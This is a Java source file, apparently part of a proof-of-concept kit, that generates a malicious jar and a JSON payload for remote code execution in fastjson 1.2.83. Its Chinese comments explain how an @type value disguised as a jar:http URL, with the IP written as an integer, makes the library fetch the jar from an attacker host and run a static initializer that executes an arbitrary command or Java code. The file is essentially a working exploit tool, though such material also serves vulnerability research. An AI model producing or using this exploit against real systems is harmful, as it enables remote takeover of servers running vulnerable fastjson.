package PoC_1283;

import picocli.CommandLine;
import picocli.CommandLine.ArgGroup;
import picocli.CommandLine.Command;
import picocli.CommandLine.Option;

import java.util.concurrent.Callable;

/**
 * 生成 fastjson 1.2.83 RCE 【一阶段 · jar:http 远程加载】的恶意 jar。
 *
 * 原理：@type 里的点号会被 replace('.','/') 转成 /，从而把类名伪装成资源路径：
 *   @type      = "jar:http:..<IP_INT>:<PORT>.<jarName>!.POC"
 *   → 资源路径  = jar:http://<IP_INT>:<PORT>/<jarName>!/POC.class
 *   → LaunchedURLClassLoader 下载该 jar → 读 POC.class → ASM 检测 @JSONType → jsonType=true
 *   → loadClass → <clinit> 执行
 *
 * 使用：
 *   java -cp ... PoC_1283.GenHttpProbe [--host H] [--port P] [--jar J] \
 *       (--cmd C | --code JAVA | --code-file F)
 * 缺省 payload = --cmd "touch /tmp/success"；详见 --help。
 */
@Command(name = "GenHttpProbe", mixinStandardHelpOptions = true,
        description = "生成 fastjson 1.2.83 一阶段 jar:http 远程加载的恶意 jar")
public class GenHttpProbe implements Callable<Integer> {

    @Option(names = "--host", defaultValue = "127.0.0.1",
            description = "攻击机 IP（payload 中自动转为整数，避免被 replace('.','/') 破坏）")
    String host;

    @Option(names = "--port", defaultValue = "11111", description = "攻击机 HTTP 端口")
    String port;

    @Option(names = "--jar", defaultValue = "probe", description = "输出 jar 名（不含扩展名）")
    String jarName;

    @ArgGroup(exclusive = true, heading = "payload（三选一，缺省 = --cmd \"touch /tmp/success\"）%n")
    Modes modes;

    @Override
    public Integer call() throws Exception {
        long ipInt = ipToInt(host);
        // 类的 internal name（/ 分隔），加载时与 @type 替换后匹配
        String internalName = "jar:http://" + ipInt + ":" + port + "/" + jarName + "!/POC";

        byte[] classBytes = JavassistGen.generate(internalName, Modes.bodyOrDefault(modes, "touch /tmp/success"));
        PocIO.writeJar("www/" + jarName, "POC.class", classBytes);

        System.out.println("[+] jar written  : www/" + jarName);
        System.out.println("[+] internalName : " + internalName);
        System.out.println("[+] body(mode)   : " + (modes == null ? "cmd" : modes.mode()));
        System.out.println("[+] payload      : {\"@type\":\"jar:http:.." + ipInt + ":" + port + "." + jarName + "!.POC\",\"x\":1}");
        return 0;
    }

    /** IPv4 点分十进制 → 整数 */
    static long ipToInt(String ip) {
        String[] p = ip.split("\\.");
        return (Long.parseLong(p[0]) << 24)
             | (Long.parseLong(p[1]) << 16)
             | (Long.parseLong(p[2]) << 8)
             | Long.parseLong(p[3]);
    }

    public static void main(String[] args) {
        System.exit(new CommandLine(new GenHttpProbe()).execute(args));
    }
}
